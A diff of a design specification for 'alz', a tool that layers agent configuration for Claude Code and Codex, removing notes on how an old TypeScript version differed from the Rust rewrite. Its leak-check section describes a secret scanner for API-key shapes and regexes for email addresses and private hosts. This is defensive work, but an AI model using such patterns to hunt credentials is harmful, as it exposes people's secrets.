-  `alz` compares paths exactly (reference drift, TASK-55.6).
+  `targets/claude/.claude/Settings.json` collides with `.claude/settings.json` (TASK-55.6).
 - The non-ASCII rule of §7.9 applies to every path below `targets/`, in a known target's folder
   or not.
 - The protected-variable checks of §7.9 have these limits:
@@ -1723,8 +1640,8 @@ so passthroughs get turned into first-class items over time.
   - The TOML text rule reports each protected variable it finds once.
   - A `mcpServers` that is neither a mapping nor a list (a plugin manifest that names another
     file) is not checked, and neither is a JSON file whose root is not an object.
-  - Nested `env` mappings are checked down to the JSON reader's depth limit of 128. The
-    TypeScript `alz` refused files nested more than 32 deep (reference drift, TASK-55.5.12).
+  - Nested `env` mappings are checked down to the JSON reader's depth limit of 128
+    (TASK-55.5.12).
 
 ### 7.12 Commit identity
 The person who owns the stack declares the identity that every commit is authored and
@@ -1777,11 +1694,10 @@ commit_identity:
   - A refused first layer leaves no winner, even when a client layer declares too: the
     declarations conflict.
   - A layer whose directory cannot be opened counts as inside the repository.
-  - The reasons keep the reference's wording: `it is inside the repository`,
+  - The reasons are `it is inside the repository`,
     `its kind is '<kind>', not 'client'` and `it is public`. `<kind>` comes from the layer and
-    is stripped (§10.1, class 1); the TypeScript `alz` prints it unstripped in the warning of an
-    ignored `account` declaration (reference drift, TASK-55.7; no acceptance case asserts
-    it).
+    is stripped (§10.1, class 1), also in the warning of an ignored `account` declaration
+    (TASK-55.7).
   - Account resolution applies its own rule to a layer inside the repository: it ignores the
     declaration, which neither wins nor conflicts (§7.13).
 - **Where it came from.** The winning layer is named in the generated Commits section, in
@@ -1848,8 +1764,8 @@ the allow state as files that are read, the resolution order, the root walk, the
 source and failing closed, and `alz account allow` with `--remove` and the hint that `alz build`
 and `alz check` print. Each other part is not built yet and names the task that builds it:
 `alz run` (TASK-50.3), `alz use` and the shell hook (TASK-50.6), `alz doctor` (TASK-50.4) and
-`alz account init` (TASK-50.5). The Rust `alz` builds the same parts in R6 (TASK-55.7), and of
-`alz doctor` only the blocked folders (below); §10.3 gives their lines. The tool facts it relies on are recorded in `docs/target-facts.md` §12 (§12 items 10 to 21
+`alz account init` (TASK-50.5). Of `alz doctor` only the blocked folders (below) are built
+(TASK-55.7); §10.3 gives their lines. The tool facts it relies on are recorded in `docs/target-facts.md` §12 (§12 items 10 to 21
 here).*
 
 Claude Code and Codex keep logins, workspace trust and per-user state in an account folder
@@ -2089,8 +2005,7 @@ account:                       # per target; a target left out is not decided by
     reason that applies and the markers by name, never by value, and for `CLAUDECODE` adds
     that Claude Code also sets it in an IDE's integrated terminal. There is no `--yes`, `-y`
     or any other way to answer: they are usage errors (exit 2). Only the terminal module
-    reads standard input (`src/cli/terminal.ts` in the TypeScript `alz`, `alz-io`'s `terminal` in
-    the Rust `alz`).
+    reads standard input (`alz-io`'s `terminal`).
   - Before it asks, it checks that `allowed.yaml` can be written (the states above) and
     refuses without a prompt otherwise; an entry equal to the current declaration for this
     root prints `already allowed` and exits 0 without a prompt or a write.
@@ -2110,8 +2025,7 @@ account:                       # per target; a target left out is not decided by
     interrupt key sends no signal and ends the line instead, so Ctrl-C reaches alz as an answer
     that is not the name and answers no. alz restores the terminal's settings after each answer
     and on every other path, an error included. When it cannot read or change those settings,
-    it asks nothing and ends the same way. (The Rust `alz`, TASK-55.7; the TypeScript `alz`
-    closes its line reader on Ctrl-C, with the same result.) After the last answer it reads the declaration again and refuses if the map,
+    it asks nothing and ends the same way (TASK-55.7). After the last answer it reads the declaration again and refuses if the map,
     the recorded source, the revision or the layer is not what was shown.
   - It records the repository's real root, the accepted per-target map (with the targets it
     leaves out) and the declaring layer's source: the remote URL without its ref, or the real
@@ -2254,10 +2168,7 @@ account:                       # per target; a target left out is not decided by
   (`layer-directory-missing`), never a layer to skip. The real path is found one component at a
   time, as §6 "Layers in or around an account folder" says: each resolved prefix is checked
   before the next component is looked at, so no name inside an account folder is `lstat`ed,
-  read as a link or opened, even through a link planted in the repository. The TypeScript
-  `alz` computes the real path with `realpath` and checks it afterwards. A planted link
-  therefore makes it `lstat` and `readlink` names inside an account folder before it refuses,
-  though it opens nothing there (reference drift, TASK-52). It reads from:
+  read as a link or opened, even through a link planted in the repository (TASK-52). It reads from:
   - a `github:` or `git:` layer outside the repository: its cache entry for the commit the
     lock pins;
   - a `path:` layer outside the repository with a `ref`: the cache entry named by the cache
@@ -2353,18 +2264,8 @@ account:                       # per target; a target left out is not decided by
     parsed tree. The error is `yaml` with the message `more than 4 MiB of scalar text, counting
     each alias use again`.
 
-  decision-28 names the serde-saphyr options, not how they count. R2 (TASK-55.3) sets them so
-  that these five hold and tests each boundary.
-
-  The TypeScript `alz` differs (reference drift, TASK-62):
-  - it caps only some of these files at 1 MiB and reads invalid UTF-8 as U+FFFD;
-  - it has no depth, node or replay budget;
-  - it uses the `yaml` library's `maxAliasCount: 100`, which counts per anchor. An anchor's
-    count starts at 1 and each alias to it adds 1, and the document is refused once count ×
-    weight passes 100. The weight of a scalar is 1, of a mapping or sequence the largest weight
-    among its items (0 when it is empty), and of an alias the count × weight of its anchor. So
-    it refuses the 100th use of an anchor on plain text, never limits the uses of an anchor on
-    an empty mapping or sequence, and accepts 51 uses of one anchor and 50 of another.
+  decision-28 names the serde-saphyr options, not how they count. They are set so that these
+  five hold (TASK-55.3).
 - **What else makes a YAML file invalid** (TASK-55.3; decision-28 as amended on 2026-11-23). The
   scope is the same as for the limits above:
   - **Control characters.** The file's text may hold tab, line feed and carriage return, since YAML
@@ -2389,17 +2290,7 @@ account:                       # per target; a target left out is not decided by
     quotes the file: no scalar, no anchor or alias name, no tag. The one exception is a duplicate
     key, printed as a quoted key (§10.1).
 
-  The TypeScript `alz` differs (reference drift):
-  - it puts the name of an unresolved alias into its error (TASK-59);
-  - it accepts a cyclic alias, and has no depth limit, so deep nesting fails by stack overflow
-    somewhere between 200 and 1000 levels (TASK-60);
-  - it decodes `!!binary` into bytes and `!!timestamp`, `!!set` and `!!omap` into a date, a set and
-    a map, and it reads `!foo` and `!!python/object` as plain text, with a Node warning on
-    standard error that quotes the input line (TASK-55.3);
-  - it accepts control characters in the file and in decoded strings (TASK-55.3);
-  - its messages are the `yaml` library's text.
-
-  More than one document is an error in both.
+  More than one document is an error.
 - **Environment** (TASK-65). Resolution reads the values of exactly these variables, by name:
   `HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `ALZ_SET_CLAUDE_CONFIG_DIR`, `ALZ_SET_CODEX_HOME`,
   `XDG_CONFIG_HOME`, `XDG_STATE_HOME` and `XDG_CACHE_HOME`. Of `__MISE_DIFF` and `DIRENV_DIFF`
@@ -2408,12 +2299,10 @@ account:                       # per target; a target left out is not decided by
   shell"), not the agent-session markers, and not `GIT_*`, since resolution runs no git. A set
   `HOME` is used as given, so an empty or relative one is not an absolute path (above). An
   unset `HOME` is the home directory that the user database records for the real user id
-  (`getpwuid_r` of `getuid()`, as Rust's `std::env::home_dir` does; TASK-55.7). The TypeScript
-  `alz` asks for the effective user id (`geteuid()`, as Node's `os.homedir()` does); the two
-  differ only for a set-user-id program. When the database has no entry for that id, or its
+  (`getpwuid_r` of `getuid()`, as Rust's `std::env::home_dir` does; TASK-55.7), not for the
+  effective user id. When the database has no entry for that id, or its
   home directory is not absolute (an empty one included), alz acts as for a `HOME` that is not
-  an absolute path. The TypeScript `alz`
-  crashes in that case (reference drift, TASK-72).
+  an absolute path (TASK-72).
 - **A named account that cannot apply fails closed** (resolver and `alz account which` built,
   TASK-50.10; `alz run`, TASK-50.3; `alz use` and the hook, TASK-50.6; decision-16). A named account cannot apply when its folder does not exist, explicit (steps
   1 and 2) or implicit (steps 3 and 4), or when, in an allowed repository, step 4 is skipped
@@ -2501,7 +2390,7 @@ account:                       # per target; a target left out is not decided by
   argument is a usage error. An exported `ALZ_USE_<TARGET>` or any other environment variable is
   never read as an `alz use` choice, so a forged one changes nothing.
 - **Shell hook** (TASK-50.6). `alz run` (TASK-50.3) starts one tool with the variable set and
-  needs no hook. A Node CLI cannot change its parent shell's environment, so, as with mise,
+  needs no hook. A program cannot change its parent shell's environment, so, as with mise,
   `alz use` and switching by folder need the hook from `eval "$(alz activate zsh)"` (or
   `bash`). The hook defines the `alz` shell function that `alz use` needs, and runs when it
   is loaded and at each prompt where the working directory changed. It then sets each
@@ -2613,9 +2502,8 @@ tool (one module each), so new targets need no core changes.
 
 **What an adapter may rely on** (TASK-55.6). An adapter relies only on what
 `docs/target-facts.md` records about the tool, and adds no output that rests on a fact that is
-UNVERIFIED there. The Rust `alz` writes, for the Claude adapter, exactly what the TypeScript
-`alz` writes, and that includes output that rests on a row still marked UNVERIFIED. Each such
-row gets a docs task that verifies it, and no new output is added on it until it is verified.
+UNVERIFIED there. The Claude adapter's output includes output that rests on a row still marked
+UNVERIFIED. Each such row gets a docs task that verifies it, and no new output is added on it until it is verified.
 Today those rows are:
 - relative paths in `permissions.additionalDirectories` (target-facts §7c);
 - how Claude treats a settings key it does not know (target-facts §7).
@@ -2658,8 +2546,8 @@ target-facts section each item relies on is given in brackets.
     §10.2's emitter, but the agent writer passes it no null, no float and no integer beyond 64
     bits. The types of §7.2 already refuse a null or a float in a typed field (code `agent`, at
     read), so only a whole number beyond 64 bits reaches the writer: an agent whose native field
-    holds one is the error `claude-agent`, naming the field and the agent's file. The TypeScript `alz` writes it
-    (reference drift, TASK-55.6.4).
+    holds one is the error `claude-agent`, naming the field and the agent's file
+    (TASK-55.6.4).
 
   The model is resolved as §7.8 says. A `model` that is not an alias of `models.yaml` is the
   error `models`, and an alias with no `claude` model is the warning `models`; the agent then
@@ -2772,11 +2660,10 @@ ones of `alz account init`, listed below.
 
 **Writes outside the repo and the cache** (§7.13), each made only by an explicit command,
 never by `build`, `check`, `alz run` or the shell hook:
-- Built (TASK-50.11; in the Rust `alz`, TASK-55.7): `alz account allow` and `alz account allow --remove` write
+- Built (TASK-50.11, TASK-55.7): `alz account allow` and `alz account allow --remove` write
   `${XDG_STATE_HOME:-~/.local/state}/agent-layerz/allowed.yaml`, with its lock file
   `allowed.yaml.lock` and a temporary file `.allowed.yaml.<pid>-<8 hex>.tmp` (both named after the real file for a link), only through
-  one writer (`src/resolve/account-allow-writer.ts` in the TypeScript `alz`, `alz-io`'s `StateDir` in
-  the Rust `alz`): under an exclusive lock file next to the file that is
+  one writer (`alz-io`'s `StateDir`): under an exclusive lock file next to the file that is
   replaced, through the temporary file in the same directory and a rename, with mode `0600` in
   a directory with mode `0700` (§7.13 "Both files" has the rest). Nothing else outside the
   repository is written by them. The file is never inside the repository, an account folder or
@@ -2833,10 +2720,8 @@ An entry is refused with code `leak-forbid` and its number when it:
 - is longer than 512 characters;
 - compiles to more than 64 KiB or nests more than 32 levels.
 
-A layer has at most 64 entries. These limits bound the work that an untrusted pattern can cause.
-The TypeScript `alz` compiles the entries as JavaScript regular expressions, without these
-limits. So a pattern that relies on look-around, backreferences, `\p{…}` or non-ASCII case
-folding passes there and is refused by the Rust `alz` (reference drift, TASK-55.5).
+A layer has at most 64 entries. These limits bound the work that an untrusted pattern can cause
+(TASK-55.5).
 
 **Secret scan.** The built-in scanner looks for fixed token shapes:
 - GitHub, Anthropic, OpenAI-style, AWS, Google, Slack and Stripe keys;
@@ -2854,8 +2739,6 @@ and `leak-host` for a private host name (ending in `.internal`, `.corp`, `.lan`,
   - per file and `forbid_patterns` entry;
   - per file and kind of secret;
   - one `leak-email` and one `leak-host` warning per file.
-
-  The TypeScript `alz` reported each line (reference drift).
 - Patterns are matched against the whole text of the file in multi-line mode: `^` and `$` match
   at the start and end of each line, and a line ends at LF, CR or CR LF.
 - Every file is turned into text before any check:
@@ -2864,8 +2747,7 @@ and `leak-host` for a private host name (ending in `.internal`, `.corp`, `.lan`,
   - Any other file is read as UTF-8, with invalid bytes replaced by U+FFFD.
   - The byte order mark is not part of the text, and every NUL is removed.
 
-  So binary, non-UTF-8 and UTF-16 files are scanned too. The TypeScript `alz` skipped a file with
-  a NUL in its first 8 KiB, which includes most UTF-16 files (reference drift, TASK-55.5).
+  So binary, non-UTF-8 and UTF-16 files are scanned too (TASK-55.5).
 - Only the `forbid_patterns` match reads `layer.yaml` without the lines of its
   `forbid_patterns` field: from the line of its key up to the line before the next key, with the
   comment lines in that span kept. The secret scan and the email and host heuristics read the
@@ -2873,13 +2755,12 @@ and `leak-host` for a private host name (ending in `.internal`, `.corp`, `.lan`,
 - A refused entry is located at `<layer>:layer.yaml`.
   - An entry that does not compile, compiles too large or nests too deep gets one message.
   - Past the 64-entry cap, only entry 65 is reported, for it and every later entry.
-- The heuristics are the reference's patterns:
+- The heuristics are these patterns:
   - An email address matches `\b[A-Za-z0-9._%+-]+@(?:[A-Za-z0-9-]+\.)+[A-Za-z]{2,}\b`, except
     one at `example.com`, `example.org`, `example.net`, `users.noreply.github.com` or
     `anthropic.com`.
   - A private host matches `(?i)\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.(?:internal|corp|lan|intranet|local)\b`.
 - The credential-assignment shape of the secret scan spells out JavaScript's white-space set.
-  That keeps its matches equal to the reference's.
 
 - A `commit_identity` (§7.12) in a public layer is public. Prefer a no-reply address (for
   GitHub, `<id>+<user>@users.noreply.github.com`); any other address raises the usual
@@ -2974,9 +2855,7 @@ With a declared `commit_identity` (§7.12):
   `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_NOSYSTEM`, the four identity variables and `EMAIL` included,
   because the check reports what git would use for a commit here. The call whose message alz
   reads (`git rev-parse --git-dir`, to tell "not a git repository" from other failures) also
-  gets `LC_ALL=C`. The TypeScript `alz` removes only `GIT_DIR`, `GIT_WORK_TREE`,
-  `GIT_COMMON_DIR`, `GIT_CONFIG` and `GIT_INDEX_FILE` (TASK-55.7; no acceptance case sets the
-  others).
+  gets `LC_ALL=C` (TASK-55.7).
 - The lines each command prints are in §10.3, "The commit identity step".
 
 ---
@@ -3006,16 +2885,13 @@ Streams, diagnostics, exit codes and how untrusted text is printed: §10.1.
 
 Expose these as mise tasks in each repo: `mise run alz:build`, `alz:check`, etc.
 
-**Implementation:** TypeScript on Node ≥ 22 (the oldest Node line still supported), so the CLI
-runs under whatever Node a project pins. Runtimes pinned by mise. No `.js` extensions on
-relative imports. Single package, distributed through npm and runnable with `npx`.
-Dependencies kept minimal (YAML parser, glob, a TOML writer, a diff library).
+**Implementation:** Rust (decision-21, decision-39), one binary built with the toolchain that
+mise pins. Dependencies are kept minimal.
 
 ### 10.1 Output and exit codes
 
 decision-26 (TASK-55.3). This section applies to every command; each command's own text adds to
-it. The Rust `alz` follows it from R2 (TASK-55.3) on. The TypeScript `alz` already uses the same
-diagnostic line and exit codes, and differs where this section says so.
+it.
 
 **Streams.** What a command reports goes to standard output: the summary of `alz lint`, the lists
 of `alz ls` and `alz explain`, the lines of `alz account which`, help and the version.
@@ -3055,9 +2931,6 @@ wrong. It never prints the field's value.
   the key cannot close its own quotes and pass the rest as message text; a backslash is printed
   as it is, and the cut counts the key's own code points, never the added quotes. Such a quoted
   key is the only text from the file that a YAML, JSON or schema diagnostic may hold.
-
-The TypeScript `alz` prints more: unknown field names in full, a refused `ref` and refused
-`workspace` paths (reference drift, TASK-55.3).
 
 **Merge diagnostics** (TASK-55.5). These are the codes of §7 and §9.2. Each names the layer and
 the file as `<where>`.
@@ -3159,8 +3032,7 @@ A command whose own text states other codes, such as `alz account which` (§10),
 **Untrusted text** is printed in exactly one of three classes:
 1. **Stripped**, in diagnostics. Every control and format character is removed, line feed
    included: U+0000 to U+001F, U+007F to U+009F, U+2028, U+2029 and every character of the
-   Unicode general category Cf. The Rust `alz` uses the Cf table of Unicode 17.0, the version
-   whose `\p{Cf}` the TypeScript `alz` uses on Node 22.
+   Unicode general category Cf, from the Cf table of Unicode 17.0.
 2. **Escaped**, for text a person decides on, such as the layer source that
    `alz account allow` shows before it asks. The text is printed in double quotes, and nothing
    is removed:
@@ -3182,9 +3054,6 @@ how it is written.
 - `--help` prints help on standard output and exits 0.
 - `--version` and `-V` print `alz <version>` and exit 0.
 - A usage error prints `error: …`, a usage line and a hint on standard error, and exits 2.
-
-The TypeScript `alz` prints a bare version and usage text of its own. Scripts must rely on
-neither (decision-26).
 
 **Internal failure.** A panic prints exactly
 `alz: internal error: this is a bug in alz, please report it`, then a line feed, on standard
@@ -3213,11 +3082,8 @@ decision-28 (TASK-55.3.8). alz writes YAML into the frontmatter of the agents, r
 generates, into the layer files `alz build --adopt` writes, and into `allowed.yaml` (§7.13). This
 section says how that document is written; the framing around it (the `---` lines and `# …`
 header of a frontmatter block, the header comment of `allowed.yaml`) belongs to the caller. The
-Rust `alz` writes the bytes the TypeScript `alz` writes (`stringifyYaml` in `src/core/yaml.ts`:
-the `yaml` package 2.9.1, block style, `lineWidth: 0`), except for the reference drift at the
-end. The golden samples in `crates/alz-core/tests/fixtures/yaml-emit/samples.json`, made from the
-reference by `crates/alz-core/tools/yaml-emit-samples.mjs`, pin the bytes; each sample's `class`
-names the rule it shows, and a `drift` field marks a sample alz writes differently.
+golden samples in `crates/alz-core/tests/fixtures/yaml-emit/samples.json` pin the bytes; each
+sample's `class` names the rule it shows.
 
 **Values.** Text, `true` and `false`, `null`, numbers, lists, and mappings with text keys, in the order
 the caller gives (§6 where a section is sorted), with no key twice. Mapping entries read from
@@ -3231,7 +3097,7 @@ anchor, alias, tag or comment.
   list. alz never writes a top-level scalar, so this section gives no rule for one.
 - An integer is decimal, with `-` when negative, exact over the 64-bit range. A number with a
   fraction or an exponent, or a whole number beyond 64 bits that a source gives as a float, is
-  written as the reference writes a JavaScript number: the shortest digits that read back as the
+  written as the shortest digits that read back as the
   same number, in plain notation from `1e-6` up to 21 digits and as `d.ddde+x` or `d.ddde-x`
   beyond (`0.5`, `0.000001`, `100000000000000000000`, `1e+21`, `1e-7`), `-0` for a negative
   zero, and `.inf`, `-.inf` and `.nan`. `null` is written as `null`. Adoption (§4.3) refuses a
@@ -3252,8 +3118,7 @@ anchor, alias, tag or comment.
 **Text.** A key or a text value takes the first form that applies:
 1. **Double-quoted** when it holds a character that alz's reader refuses (§7.13, "Control
    characters"): U+0000 to U+0008, U+000B to U+001F, U+007F to U+009F, U+2028 or U+2029. They are
-   written as escapes (see "Double-quoted"), never raw, which the reference does for U+007F to
-   U+009F inside double quotes and for U+2028 and U+2029 anywhere (reference drift, TASK-73).
+   written as escapes (see "Double-quoted"), never raw (TASK-73).
 2. **Quoted** when it starts with U+FEFF, or is made only of spaces and line feeds and holds both.
 3. **Quoted** when it is a key that holds a line feed.
 4. When plain YAML cannot hold it: it starts with a line feed, tab, space or one of
@@ -3281,7 +3146,7 @@ anchor, alias, tag or comment.
 **Double-quoted.** Start from J, the text as JSON writes a string: `"`, each character, `"`. In J,
 `"` is `\"`, `\` is `\\`, U+0008 is `\b`, U+000C `\f`, a line feed `\n`, a carriage return `\r`, a
 tab `\t`, and every other character below U+0020, and U+007F to U+009F, U+2028 and U+2029
-(reference drift, TASK-73: the reference writes these raw), is `\u` and four lower-case
+(TASK-73), is `\u` and four lower-case
 hexadecimal digits; every other character is as it is. J is written with these changes:
 - Each `\uXXXX` becomes YAML's escape: `\0` for U+0000, `\a` for U+0007, `\v` for U+000B, `\e`
   for U+001B, `\N` for U+0085, `\L` for U+2028, `\P` for U+2029, and otherwise `\x` and the last
@@ -3291,8 +3156,7 @@ hexadecimal digits; every other character is as it is. J is written with these c
   written as a line break instead of `\n`: a run of n such line feeds becomes n + 1 line feeds
   and then the continuation indent.
 - A space right before a line feed (`\n` or a line break), or right after a run written as line
-  breaks, is written `\ `, once when both hold (reference drift, TASK-73: where both hold, the
-  reference writes it twice).
+  breaks, is written `\ `, once when both hold (TASK-73).
 
 **Literal block.** Text that ends in spaces or tabs after its last line feed is quoted instead.
 Otherwise let E be the text's trailing run of line feeds, tabs and spaces, and B the text before
@@ -3314,37 +3178,19 @@ NEL, U+2028 or U+2029 as a line break, so a committed file would review differen
 holds, some terminals act on C1 controls, and YAML 1.1 readers take NEL, U+2028 and U+2029 as
 line breaks.
 
-The TypeScript `alz` differs (reference drift, decision-30, TASK-73). These change generated
-bytes only for the text named; the cutover release (R8, TASK-55.9) lists them.
-- It writes plain what alz's reader reads as another value or refuses, and alz quotes it: `0b`
-  integers with or without a sign and `0o` and `0x` integers with a sign, which alz's reader
-  reads as integers (rule 7); text that starts with U+FEFF, which it refuses (rule 2); and text
-  made only of spaces and line feeds that holds both, which it writes as a block that reads back
-  without its spaces (rule 2). Samples: class `reference-reads-differently`.
-- In long double-quoted text it writes a space between a line feed written as a line break and
-  another line feed as `\\ `, which reads back as a backslash; alz writes `\ ` once, which reads
-  back as the space ("Double-quoted"). This is reachable by text that rule 1 double-quotes and by
-  text that a block cannot hold (it ends in blanks after its last line feed). Samples: class
-  `double-quoted-blank-between-line-feeds`, drift `space-between-line-feeds-in-long-double-quoted-text`.
-- It writes U+007F to U+009F raw inside double quotes, and U+2028 and U+2029 raw, plain or in a
-  block; alz double-quotes the text and escapes them (rule 1 and "Double-quoted"). Because J
-  writes each of them as six units, the 40-unit limit of long text is reached sooner than the
-  reference's. Samples: drift `escaped-characters-the-reference-writes-raw`.
-
 ### 10.3 Output of build, check, diff, ls, explain, doctor and init
 
-TASK-55.6. This section gives the Rust `alz`'s lines; §10.1 gives the streams, the diagnostic line
+TASK-55.6. This section gives alz's lines; §10.1 gives the streams, the diagnostic line
 and the exit codes. Names and paths that come from layers, the repository, the file system or
 Claude are printed as validated names or stripped (class 1). `<n> file` and the like take a
 plural `s` when `<n>` is not 1. The commit identity step of `init`, `build` and `check` (§9.4), `alz
-account which`, `alz account allow` and the account note of §7.13 come with R6 (TASK-55.7) and
+account which`, `alz account allow` and the account note of §7.13 (TASK-55.7)
 close this section.
 
 **Shared steps.** `build`, `check`, `diff`, `ls`, `explain` and `doctor` read the manifest and
 `layer.lock`, resolve and merge the stack, and render the build in memory (§6). They print its
 diagnostics first. `build`, `check`, `diff`, `ls` and `explain` then stop with exit 1 when one of
-them is an error. `doctor` reports them as part of its report. The TypeScript `alz explain`
-goes on after an error and shows what it merged (reference drift, TASK-55.6).
+them is an error. `doctor` reports them as part of its report (TASK-55.6).
 
 **`alz build`.**
 - A collision prints `error [collision] <path>: exists and was not generated by agent-layerz;
@@ -3409,16 +3255,14 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   the lines between those shared ends are all removed and all the new ones added, which is still
   a valid patch but not a shortest one, so a crafted file takes bounded time.
 - A change whose bytes equal what is on disk, a file that differs only in its executable bit or
-  an empty file that is created, prints its two header lines and no hunk, as the reference does
-  (without jsdiff's `====` line). A change to `.gitignore` is not shown, and does not stop
-  `no changes` from printing, as in the reference.
+  an empty file that is created, prints its two header lines and no hunk. A change to `.gitignore` is not shown, and does not
+  stop `no changes` from printing.
 - Content with a NUL in its first 8192 bytes, or that is not valid UTF-8, prints
   `Binary file <path> changes` instead.
 - Each collision is `note [collision] <path>: is not generated by agent-layerz; alz build will
   refuse to overwrite it` on standard error.
 - When no generated file changes and `layer.lock` is current it prints `no changes`.
-- Exit 0, unless the build had an error. The TypeScript `alz` prints the patch text of the `diff`
-  package (jsdiff), whose header, hunks and binary test differ (reference drift, TASK-55.6).
+- Exit 0, unless the build had an error (TASK-55.6).
 
 **`alz ls [--live]`.**
 - Six sections are printed in order: `agents`, `skills`, `commands`, `rules`, `hooks` and `mcp`,
@@ -3427,8 +3271,7 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   `  <name padded with spaces to 28 characters> <layer>`. `<layer>` is the name of the most
   specific layer that contributed to the item.
 - Items are in name order, hooks in stack and file order, and servers in `mcp.enable` order. The
-  slot stubs are listed with the skills, with `slot stub` for their layer. The TypeScript `alz`
-  lists skills and commands in the order the layers define them (reference drift, TASK-55.6).
+  slot stubs are listed with the skills, with `slot stub` for their layer (TASK-55.6).
 - `--live` needs the `claude` target, else `error [ls] --live needs the claude target`. It prints
   a blank line and `asking <bin> what it loads here (one short model call)…`, then runs `<bin>`
   (`ALZ_CLAUDE_BIN`, else `claude`) once in the repository. The arguments are `-p "Reply with
@@ -3492,8 +3335,7 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   `.claude/skills/<name>/SKILL.md`, `.claude/rules/<name>.md`, `.claude/settings.json` for a
   hook, `.mcp.json` and `AGENTS.md`.
 - A name the merged result does not have is `error [explain] no <type> named '<name>' in the
-  merged result`, and exit 1. The TypeScript `alz` prints the message without the diagnostic
-  prefix (reference drift, TASK-55.6).
+  merged result`, and exit 1 (TASK-55.6).
 - The text of the output files is stripped of control and format characters, line feeds and tabs
   kept (§10.1): a carriage return, an escape, a bidirectional control and every other control or
   format character can move the cursor or hide text, and a tab cannot.
@@ -3512,9 +3354,8 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   `~/.codex-alz-blocked` (§7.13) are not among them; for each that exists, whatever the targets,
   doctor prints `warning: <folder> is a blocked folder (§7.13), not an account; delete it`
   after the claude section (Claude's folder first), which is not a problem and does not change the
-  exit code; it looks at each with `lstat` and opens nothing in it (TASK-50.4). The TypeScript `alz` lists `~/.claude-alz-blocked` as an account folder, and also
-  the folders named in `ALZ_ACCOUNT_DIRS`, a variable the Rust `alz` does not read (reference
-  drift, TASK-55.7).
+  exit code; it looks at each with `lstat` and opens nothing in it (TASK-50.4). Doctor does not read `ALZ_ACCOUNT_DIRS`
+  (TASK-55.7).
 - The version, from `<bin> --version`, found and run as for `ls --live` but with the environment
   of `PATH`, `HOME`, `USER`, `LOGNAME`, `TMPDIR`, `TERM`, `LANG`, `LC_*`, `CLAUDE_CONFIG_DIR` and the
   `XDG_*_HOME` variables only, a deadline of 10 seconds and 64 KiB of output. The first
@@ -3533,14 +3374,14 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   or agents may load in this repo`.
 - `build: <e> errors, <w> warnings`, each diagnostic indented by two spaces, then `doctor: ok`
   (exit 0) or `doctor: <n> problems` (exit 1). A problem is a collision or a build error.
-- When the build has an error, no built names are known, so the collision check finds none (the
-  TypeScript `alz` compares with what it merged: reference drift, TASK-55.6).
+- When the build has an error, no built names are known, so the collision check finds none
+  (TASK-55.6).
 
 **`alz init`.**
 - Options: `--kind repo|layer` (default `repo`), `--name`, `--visibility
   public|private|confidential` (default `private` for a repo and `public` for a layer), `--stack
-  <source>` (repeatable), `--hub <dir>`. A value outside these is a usage error (exit 2; the
-  TypeScript `alz` exits 1 for a bad visibility).
+  <source>` (repeatable), `--hub <dir>`. A value outside these is a usage error (exit 2), a bad
+  visibility included.
 - `error [init] layer.yaml already exists here` and `error [init] '<name>' is not a valid layer
   name; pass --name` exit 1. The default name is the folder's name in lower case, with each run of
   other characters than `a` to `z` and `0` to `9` replaced by `-`, and `-` trimmed at both ends.
@@ -3548,12 +3389,12 @@ goes on after an error and shows what it merged (reference drift, TASK-55.6).
   `path:` source, and `<dir>@<ref>` pins a ref when the text after the last `@` holds no `/`.
   A value that is not a source (§5.2), whose pin is not a git ref (§5.2) or that holds a control
   character is `error [init] a --stack value <rule>` (the value is never printed), exit 1, and
-  nothing is written; the TypeScript `alz` writes it as given (reference drift, decision-30).
+  nothing is written.
 - `--hub <dir>` adds `path:<dir>/layer` when `<dir>/layer/layer.yaml` exists, pinned to the newest
   tag `git tag --list 'layer-v*' --sort=-v:refname` gives, by §6's git rules, and prints
   `using the hub's client layer <source> at <ref>`. A tag that is not a valid git ref (§5.2) is
   `error [init] the newest layer-v* tag of the hub is not a valid git ref`, and nothing is written.
-- The files are created as the TypeScript `alz` writes them, byte for byte. A repo gets
+- The files have fixed contents. A repo gets
   `layer.yaml`, `.layer/layer.yaml` and `.layer/instructions/50-repo.md` when `.layer/layer.yaml`
   does not exist, and `mise.toml` with the `alz:*` tasks when there is no mise config. When there
   is one, the tasks are printed after `add these tasks to your mise config:` instead. A layer gets
@@ -3593,15 +3434,12 @@ name and its source as written, stripped (class 1), and `<level>` is `warning` i
   git identity declared by <by>. <advice>`, then the findings.
   - `<reason>` is `the repository root is not the top level of its work tree`, `.git is not a
     plain directory (a linked worktree, submodule or symlink)`, `.git/config is not a regular
-    file` (a link at `.git/config` included) or `the repository could not be inspected`. The
-    TypeScript `alz` also has `.git/config resolves outside the repository`, which the Rust
-    `alz` never prints.
+    file` (a link at `.git/config` included) or `the repository could not be inspected`.
   - For the first, `<advice>` is ``Run `git init` here first, or run alz from the repository's
     top level.`` and the findings have no fix. For the others it is `Run by hand: <step>;
     <step>` on the same line, one step per key: `git config --local user.name '<name>'` and `git
     config --local user.email '<email>'`, or the `set …` sentence above for a value that is not
-    shell-safe. The TypeScript `alz` puts each step on a line of its own, indented by two spaces
-    (reference drift, TASK-55.7: a diagnostic is one line, §10.1).
+    shell-safe (TASK-55.7: a diagnostic is one line, §10.1).
 - Setup, for `user.name` and then `user.email`:
   - a key `.git/config` does not have is written, and standard output gets `set <key> in
     .git/config to '<declared value>' (declared by <by>)`;
@@ -3941,7 +3779,8 @@ when the installed tool is outside that range.
 
 ## 13. Acceptance tests
 
-The tool is done when all of these pass in CI (fixtures under `test/fixtures/`):
+The tool is done when all of these hold. Rust tests prove them (decision-39), and the fixture
+repositories they build are under `fixtures/`:
 
 1. **Determinism:** building twice gives byte-identical output, and `alz check` passes.
 2. **Instruction stacking:** personal + client + repo produce one `AGENTS.md` with three
@@ -3963,8 +3802,7 @@ The tool is done when all of these pass in CI (fixtures under `test/fixtures/`):
     different empty account dirs, the effective agents and skills listed by each tool are
     identical.
 13. **Two targets:** the same fixtures produce valid output for both `claude` and `codex`.
-    Both tools start in the fixture repo without config errors (smoke test, skipped if the
-    tool isn't installed).
+    Both tools start in the fixture repo without config errors (where the tool is installed).
 14. **Non-destructive:** an existing hand-written `.claude/agents/foo.md` makes the build fail
